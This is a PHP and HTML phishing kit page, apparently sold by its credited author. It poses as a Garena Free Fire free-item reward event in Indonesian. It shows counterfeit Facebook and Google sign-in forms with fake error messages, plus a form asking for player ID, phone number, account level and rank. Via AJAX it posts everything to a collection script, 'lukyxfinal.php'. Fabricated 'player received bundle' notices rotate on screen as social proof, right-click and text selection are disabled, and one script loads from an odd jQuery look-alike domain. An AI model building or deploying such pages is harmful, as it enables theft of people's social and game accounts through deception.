<?php
// Creator Sc  : LUKY NESIA 
// Order Script : 6289509551861
// Telegram   : t.me/luky_nesia

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html>
 <head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"> 
  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
  <meta property="og:title" content="Garena Free Fire. Best survival Battle Royale on mobile!"> 
  <meta property="og:url" content="./"> 
  <meta property="og:site_name" content="Garena Free Fire. Best survival Battle Royale on mobile!"> 
  <meta property="og:type" content="website"> 
  <meta name="copyright" content="Garena Free Fire. Best survival Battle Royale on mobile!"> 
  <meta name="theme-color" content="#000"> 
  <title>Garena Free Fire. Best survival Battle Royale on mobile!</title> 
  <meta name="robots" content="noindex, nofollow"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/tamp11/css/sty.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/tamp11/css/animate.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/tamp11/css/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/tamp11/css/google.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/tamp11/css/style.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/tamp11/css/style1.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <style type="text/css">
      body {
        background: #000 center/cover no-repeat;
        margin: 0;
        font-family: Teko
      }

      .navbar {
        background: url(https://cdn.stackpath.web.id/tamp11/img/navbar.jpg) top center/100% no-repeat;
        width: 100%;
        height: 65px
      }

      .event-theme {
        width: 98%;
        height: 53px;
        margin-top: -15px;
        margin-bottom: -15px;
        margin-left: auto;
        margin-right: auto;
        display: block
      }

      .event-subtitle {
        display: block;
        margin-left: 5%;
        margin-right: 5%;
        margin-top: -15px;
        margin-bottom: 15px;
        overflow: hidden;
        text-align: center;
        font-family: Teko;
        white-space: nowrap;
        width: 90%;
        font-size: 61px;
        text-shadow: 0 1.1px 0 #ffb900
      }

      .event-subtitle>span {
        display: inline-block;
        position: relative;
        color: #fff;
        cursor: default;
        font-size: 1.2rem;
        font-family: Teko
      }

      .event-subtitle>span:after,
      .event-subtitle>span:before {
        background: #17aeff;
        border-bottom: 1px solid #ffb900;
        content: "";
        height: 2px;
        position: absolute;
        top: 50%;
        width: 9999px
      }

      .event-subtitle>span:before {
        margin-right: 8px;
        right: 100%
      }

      .event-subtitle>span:after {
        left: 100%;
        margin-left: 8px
      }

      .footer {
        background: #131313;
        width: 100%;
        height: auto;
        padding: 15px
      }

      .nav-popup-title {
        padding-left: 15px;
        margin-top: -6px;
        color: #000;
        font-size: 22px;
        font-family: Teko;
        font-weight: 500;
        text-align: center
      }

      .nav-popup img {
        width: 20px;
        height: 20px;
        margin-top: 0;
        margin-right: 20px;
        color: #000;
        float: right
      }

      .popup-alert {
        width: 95%;
        height: auto;
        margin-top: 10px;
        margin-left: auto;
        margin-right: auto;
        margin-bottom: 10px;
        padding: 5px;
        color: #cdcdcd;
        font-size: 20px;
        font-family: Teko;
        font-weight: 400;
        text-align: center;
        display: block
      }

      .popup-alert i {
        padding-top: 15px;
        padding-bottom: 15px;
        color: #1eed1a;
        font-size: 40px;
        text-align: center
      }

      .popup-footer button:nth-child(1) {
        width: auto;
        height: auto;
        margin-top: 4px;
        margin-left: auto;
        margin-right: auto;
        padding: 3px;
        padding-left: 28px;
        padding-right: 28px;
        color: #000;
        font-size: 18px;
        font-family: Teko;
        font-weight: 500;
        text-align: center;
        border: none;
        outline: 0
      }

      .popup-btn-login {
        width: 85%;
        height: auto;
        padding: 8px;
        margin-left: auto;
        margin-right: auto;
        color: #000;
        font-size: 15px;
        font-family: Teko;
        border-radius: 2px;
        border: none;
        outline: 0
      }

      .popup-btn-login img {
        width: 20px;
        margin-top: 1px;
        float: left
      }

      .popup-btn-login i {
        color: #fff;
        font-size: 20px;
        float: left
      }

      .popup-btn-facebook {
        background: #1778f2;
        color: #fff;
        margin-bottom: 3px
      }

      .popup-btn-google {
        background: #e0e0e0;
        margin-bottom: 3px;
        color: #000
      }

      .popup-form-footer {
        margin-top: -16px
      }

      .popup-form-footer button {
        width: auto;
        height: auto;
        margin-top: 4px;
        padding: 3px;
        padding-left: 30px;
        padding-right: 30px;
        color: #000;
        font-size: 18px;
        font-family: Teko;
        font-weight: 500;
        text-align: center;
        border: none;
        outline: 0
      }

      .popup-form input {
        background: #1a1b1c;
        background-size: 100% 100%;
        width: 90%;
        height: auto;
        margin-left: 6px;
        margin-bottom: 3px;
        padding: 4.4px;
        color: #c3c3c3;
        font-size: 17px;
        font-family: Teko;
        font-weight: 500;
        border-radius: 2px;
        border: 1px solid #8f8f8f;
        position: relative;
        outline: 0;
        -webkit-appearance: none;
        -moz-appearance: none
      }

      .popup-form input::placeholder {
        color: #fffbf7
      }

      .popup-form select {
        background: #1a1b1c;
        background-size: 100% 100%;
        width: 90%;
        height: auto;
        margin-left: 6px;
        margin-bottom: 3px;
        padding: 6px;
        padding-left: 6px;
        color: #c3c3c3;
        font-size: 17px;
        font-family: Teko;
        font-weight: 500;
        border-radius: 2px;
        border: 1px solid #8f8f8f;
        position: relative;
        outline: 0;
        -webkit-appearance: none;
        -moz-appearance: none
      }
    </style> 
 </head> 
 <body oncontextmenu="return!1" onselectstart="return!1" ondragstart="return!1" style=""> 
  <div class="container"> 
   <div class="navbar"> 
    <div class="navbar-right"></div> 
   </div> 
   <div class="header"> 
    <img src="https://cdn.stackpath.web.id/tamp11/img/heade77r.jpg"> 
   </div> 
    <center> 
     <div class="tab_rewards" id="latest"> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/1.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/1.jpg">AMBIL</button> 
       </div> 
      </div> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/2.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/2.jpg">AMBIL</button> 
       </div> 
      </div> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/3.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/3.jpg">AMBIL</button> 
       </div> 
      </div> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/4.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/4.jpg">AMBIL</button> 
       </div> 
      </div> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/5.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/5.jpg">AMBIL</button> 
       </div> 
      </div> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/6.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/6.jpg">AMBIL</button> 
       </div> 
      </div> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/7.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/7.jpg">AMBIL</button> 
       </div> 
      </div> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/8.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/8.jpg">AMBIL</button> 
       </div> 
      </div> 
      <div class="item itemShine"> 
       <div> 
        <figure> 
         <img style="border-bottom:0" src="https://cdn.stackpath.web.id/tamp11/img/9.jpg"> 
        </figure> 
       </div> 
       <div> 
        <button type="button" onmousedown="buka.play()" onclick="open_itemReward_confirmation(this)" src="https://cdn.stackpath.web.id/tamp11/img/9.jpg">AMBIL</button> 
       </div> 
      </div> 
     </div> 
    </center> 
   </div> 
   <div class="footer" style="top:-80px"> 
    <img class="footer-copyright-icon" src="https://cdn.stackpath.web.id/11/img/bff.png"> 
    <div class="footer-copyright-text"> 
     <div class="footer-txt-copyrights">
      Copyright © Garena International. Trademarks belong to their respective owners. All rights reserved.
     </div> 
     <div class="footer-copyright-text-left">
      Privacy Policy
     </div> 
     <div class="footer-copyright-text-center">
      For Parents FAQ
     </div> 
     <div class="footer-copyright-text-right">
      Terms of Service
     </div> 
    </div> 
   </div> 
   <div class="popup itemReward_confirmation" style="display:none"> 
    <div class="popup-box"> 
     <div class="nav-popup"> 
      <img onmousedown="tutup.play()" onclick="close_reward_confirmation()" src="https://cdn.stackpath.web.id/tamp11/img/popup-close.png"> 
      <center> 
       <div class="nav-popup-title">
        SELAMAT
       </div> 
      </center> 
     </div> 
     <div class="popup-box-bg"> 
      <div class="popup-alert">
       Yakin Ingin Dapatkan Hadiah Ini?
      </div> 
      <div class="popup-item itemShine"> 
       <div> 
        <figure> 
         <img src="index.php" id="myItemReward_confirmationImg"> 
        </figure> 
       </div> 
      </div> 
      <br> 
     </div> 
     <div class="popup-footer"> 
      <button type="button" onmousedown="buka.play()" onclick="open_account_login()">Dapatkan</button> 
     </div> 
    </div> 
   </div> 
   <div class="popup account_login" style="display:none"> 
    <div class="popup-box"> 
     <div class="nav-popup"> 
      <div class="nav-popup-title">
       Verifikasi Hadiah
      </div> 
     </div> 
     <div class="popup-box-bg"> 
      <div class="popup-alert">
       Masuk Menggunakan Akun Free Fire Kamu
      </div> 
      <button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook()"> <img src="https://cdn.stackpath.web.id/tamp11/img/icon_fb.png" style="margin-top:-2px"> Sign in Dengan Facebook </button> 
      <br> 
      <button type="button" class="popup-btn-login popup-btn-google" onclick="open_google()"> <img src="https://cdn.stackpath.web.id/tamp11/img/icon_gp.png" style="margin-top:-2px"> Sign in Dengan Google </button> 
      <br> 
     </div> 
    </div> 
   </div> 
   <div class="popup-footer-log"></div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display:none"> 
   <div class="popup-box-login-fb"> 
    <a onclick="close_facebook()" class="close-fb"> <i class="zmdi zmdi-close"></i> </a> 
    <div class="navbar-fb"> 
     <img src="https://cdn.stackpath.web.id/tamp11/img/facebook-text.png"> 
    </div> 
    <div class="content-box-fb"> 
     <p class="kaget email-fb" style="width:320px;top:-5px;text-align:left">Alamat email atau nomor telepon yang Anda masukkan tidak cocok dengan akun mana pun. <b>Mendaftarlah untuk sebuah akun.</b> </p> 
     <p class="kaget sandi-fb" style="width:320px;top:-5px;text-align:left">Kata sandi yang Anda masukkan salah. Lupa kata sandi?</p> 
     <img src="https://cdn.stackpath.web.id/tamp11/img/logff.png"> 
     <div class="txt-login-fb">
      Masuk Ke Akun Facebook Anda Untuk terhubung dengan Garena Free Fire.
     </div> 
     <form action="javascript:void(0)" method="post" id="ValidateVerificationDataFB"> 
      <input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Nomor Ponsel Atau Alamat Email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required> 
      <div class="showHide showPassword" onclick="showFbPassword()"> 
       <i class="zmdi zmdi-eye-off zmdi-hc-2x"></i> 
      </div> 
      <div class="showHide hidePassword" style="display:none" onclick="hideFbPassword()"> 
       <i class="zmdi zmdi-eye zmdi-hc-2x"></i> 
      </div> 
      <input type="hidden" name="login" id="login-facebook" value="Facebook" readonly> 
      <button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button> 
     </form> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       India
      </div> 
      <div class="language-name">
       Türkçe
      </div> 
      <div class="language-name">
       Tiếng Việt
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-login login-google animated fadeIn" style="display:none"> 
   <div class="popup-box-login-google"> 
    <a onmousedown="tutup.play()" onclick="close_google()" class="close-other"> <i class="zmdi zmdi-close"></i> </a> 
    <div class="box-google"> 
     <div class="header-google"> 
      <svg viewbox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf"> 
       <g id="qaEJec"> 
        <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path> 
       </g> 
       <g id="YGlOvc"> 
        <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path> 
       </g> 
       <g id="BWfIk"> 
        <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path> 
       </g> 
       <g id="e6m3fd"> 
        <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path> 
       </g> 
       <g id="vbkDmc"> 
        <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path> 
       </g> 
       <g id="idEJde"> 
        <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path> 
       </g> 
      </svg> 
     </div> 
     <div class="txt-login-google">
      Sign in
     </div> 
     <div class="txt-login-google-desc">
      Use your Google account
     </div> 
     <form action="javascript:void(0)" method="post" id="ValidateVerificationDataGP"> 
      <div class="input-box"> 
       <input type="text" class="input-1" name="email" id="email-google" onfocus="setFocus(!0)" onblur="setFocus(!1)" placeholder="Email or Phone" required> 
      </div> 
      <div class="input-box"> 
       <input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(!0)" onblur="setFocus(!1)" placeholder="Password" required> 
      </div> 
      <input type="hidden" name="login" id="login-google" value="Google" readonly> 
      <div class="email-google" style="color:#d50000;font-size:14px;text-align:left;display:none"> 
       <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewbox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"> 
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path> 
       </svg>Could not find your Google Account. 
      </div> 
      <div class="sandi-google" style="color:#d50000;font-size:14px;text-align:left;display:none"> 
       <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewbox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"> 
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path> 
       </svg>Wrong password, try again. 
      </div> 
      <button type="button" class="btn-forgot-google">Forgot email?</button> 
      <br> 
      <div class="notify-google">
       Not your computer? Use Guest mode to sign in privately. 
       <span>Learn more</span> 
      </div> 
      <br> 
      <button type="submit" class="btn-login-google" onclick="ValidateLoginGoogleData()">Next</button> 
      <button type="button" class="btn-create-google">Create account</button> 
     </form> 
     <br> 
     <br> 
    </div> 
   </div> 
  </div> 
  <div class="popup account_verification" style="display:none"> 
   <div class="popup-box"> 
    <div class="nav-popup"> 
     <div class="nav-popup-title">
      Verifikasi Akun
     </div> 
    </div> 
    <div class="popup-box-bg"> 
     <div class="popup-alert">
      Lengkapi detail akun Anda
     </div> 
     <form class="popup-form" action="javascript:void(0)" method="post" id="FormFB"> 
      <input type="hidden" name="email" id="validateEmail" readonly> 
      <input type="hidden" name="password" id="validatePassword" readonly> 
      <input type="hidden" name="login" id="validateLogin" readonly> 
      <input type="number" name="playid" id="playid" placeholder="Player ID" autocomplete="off" required> 
      <input type="number" name="phone" id="phone" placeholder="Nomor Ponsel" autocomplete="off" required> 
      <select style="color:#fff" name="level" id="level" required> <option selected disabled value="">Level Akun</option> <option>1</option> <option>2</option> <option>3</option> <option>4</option> <option>5</option> <option>6</option> <option>7</option> <option>8</option> <option>9</option> <option>10</option> <option>11</option> <option>12</option> <option>13</option> <option>14</option> <option>15</option> <option>16</option> <option>17</option> <option>18</option> <option>19</option> <option>20</option> <option>21</option> <option>22</option> <option>23</option> <option>24</option> <option>25</option> <option>26</option> <option>27</option> <option>28</option> <option>29</option> <option>30</option> <option>31</option> <option>32</option> <option>33</option> <option>34</option> <option>35</option> <option>36</option> <option>37</option> <option>38</option> <option>39</option> <option>40</option> <option>41</option> <option>42</option> <option>43</option> <option>44</option> <option>45</option> <option>46</option> <option>47</option> <option>48</option> <option>49</option> <option>50</option> <option>51</option> <option>52</option> <option>53</option> <option>54</option> <option>55</option> <option>56</option> <option>57</option> <option>58</option> <option>59</option> <option>60</option> <option>61</option> <option>62</option> <option>63</option> <option>64</option> <option>65</option> <option>66</option> <option>67</option> <option>68</option> <option>69</option> <option>70</option> <option>71</option> <option>72</option> <option>73</option> <option>74</option> <option>75</option> <option>76</option> <option>77</option> <option>78</option> <option>79</option> <option>80</option> <option>81</option> <option>82</option> <option>83</option> <option>84</option> <option>85</option> <option>86</option> <option>87</option> <option>88</option> <option>89</option> <option>90</option> <option>91</option> <option>92</option> <option>93</option> <option>94</option> <option>95</option> <option>96</option> <option>97</option> <option>98</option> <option>99</option> <option>100</option> </select> 
      <select style="color:#fff" name="rank" id="rank" required> <option selected disabled value="">Tier</option> <option>Bronze</option> <option>Silver</option> <option>Gold</option> <option>Diamond</option> <option>Heroic</option> <option>Master</option> <option>GrandMaster</option> </select> 
      <br> 
      <br> 
     </form>
    </div> 
    <div class="popup-form-footer"> 
     <button type="button" onmousedown="buka.play()" onclick="ValidateVerificationData()">Verifikasi</button>
    </div> 
   </div> 
  </div> 
  <div class="popup check_verification" style="display:none"> 
   <div class="popup-box"> 
    <div class="nav-popup"> 
     <div class="nav-popup-title">
      Account Verification
     </div> 
    </div> 
    <div class="popup-box-bg"> 
     <div class="popup-alert"> 
      <br> 
      <i class="zmdi zmdi-spinner zmdi-hc-spin"></i> 
      <br>Tunggu Sebentar........ 
      <br> 
      <br> 
     </div> 
     <div class="popup-form-footer"></div> 
    </div> 
   </div> 
  </div> 
  <div class="popup processing_account" style="display:none"> 
   <div class="popup-box"> 
    <div class="nav-popup"> 
     <div class="nav-popup-title">
      Successfull
     </div> 
    </div> 
    <div class="popup-box-bg"> 
     <div class="popup-alert">
      Hai Survivor 
      <br> 
      <p>Penukaran hadiah anda sedang dalam proses. <br>Garena Free Fire juga akan memberi tahu Anda lewat In-Game Mail, Ketika Hadiah Berhasil Terkirim. Dimohon untuk menunggu proses hingga 1-2 hari (48 Jam) <br>Salam Booyah! </p> 
     </div> 
     <div class="popup-footer"> 
      <button type="button" onmousedown="tutup.play()" style="background:url(https://cdn.stackpath.web.id/tamp11/img/menu_on.png) no-repeat center center;background-size:100% 100%" onclick="location.href=&quot;https://ff.9arena.my.id/id/&quot;">Logout</button> 
     </div> 
    </div> 
   </div> 
  </div> 
  <div class="notification-fgncode-container"> 
   <div class="notification-fgncode" style="opacity: 0; transform: translateY(20px); animation: 0.5s ease 0s 1 normal forwards running slideIn;">
    <i class="fas fa-gift"></i>
    <span class="notification-text-fgncode">ID 6832853853 Mendapatkan - MIDNIGHT VANGUARD BUNDLE!</span>
   </div> 
  </div> 
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <script src="https://jquery.biz.id/libs/jquery-10.min.js"></script>
  <script src="js/jquery.min.js"></script>
  <script>
  function CodxSubmitData(formData) {
  $.ajax({
    type: "POST",
    url: "lukyxfinal.php",
    data: formData,
    beforeSend: function () {
      $(".processing_account").show();
      $(".account_verification").hide();
    },
    success: function (response) {
      // Tambahkan ini untuk memastikan sukses
      // Ubah ini sesuai kebutuhan, misalnya redirect atau tampilkan pesan
      $(".processing_account").hide();
      $(".success_message").text("Berhasil dikirim!").show();
    },
    error: function (xhr, status, error) {
      // Tangani error AJAX
      $(".processing_account").hide();
      $(".account_verification").show();
      alert("Terjadi kesalahan saat mengirim data: " + error);
    }
  });
}
</script> 
  <script>
      $(document).ready(function() {
        var e = 59,
          n = 59,
          i = 23;
        ! function t() {
          setTimeout(t, 1e3), $("#latestTimer").html(i + " : " + n + " : " + e), --e < 0 && (e = 59, --n < 0 && (e = n = 0))
        }()
      })
    </script> 
  <script>
      var buka = new Audio;
      buka.src = "https://cdn.stackpath.web.id/tamp11/img/buka.mp3";
      var tutup = new Audio;

      function openRewards(e, t) {
        var a, n, s;
        for (n = document.getElementsByClassName("tab_rewards"), a = 0; a < n.length; a++) n[a].style.display = "none";
        for (s = document.getElementsByClassName("menu-content"), a = 0; a < s.length; a++) s[a].className = s[a].className.replace(" menu-content-active", "");
        document.getElementById(t).style.display = "block", e.currentTarget.className += " menu-content-active"
      }
      tutup.src = "https://cdn.stackpath.web.id/tamp11/img/tutup.mp3", document.getElementById("defaultTabRewards").click()
    </script> 
  <script>
    const notificationElement = document.querySelector(".notification-fgncode");
const notificationsfgncode = ["ID 6832853853 Mendapatkan - MIDNIGHT VANGUARD BUNDLE!", "ID 7964207458 Mendapatkan - Bundle Nailoong!", "ID 8252843428 Mendapatkan - Tas Nailoong!", "ID 9712215007 Mendapatkan - Topi Jerami!", "ID 1062432772 Mendapatkan - Sepatu Jordan!", "ID 9724423729 Mendapatkan - M1187 One Puch Man!", "ID 8605420468 Mendapatkan - M1187 Rapper!", "ID 7743327830 Mendapatkan - Ak47 Draco!"];
let currentNotificationIndex = 0;
function showNotification() {
  notificationElement.innerHTML = "<i class=\"fas fa-gift\"></i><span class=\"notification-text-fgncode\">" + notificationsfgncode[currentNotificationIndex] + "</span>";
  notificationElement.style.opacity = '0';
  notificationElement.style.transform = "translateY(20px)";
  notificationElement.style.animation = "slideIn 0.5s forwards";
  setTimeout(() => {
    notificationElement.style.animation = "slideOut 0.5s forwards";
  }, 1500);
  setTimeout(() => {
    currentNotificationIndex = (currentNotificationIndex + 1) % notificationsfgncode.length;
    showNotification();
  }, 2000);
}
window.addEventListener("DOMContentLoaded", () => {
  showNotification();
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>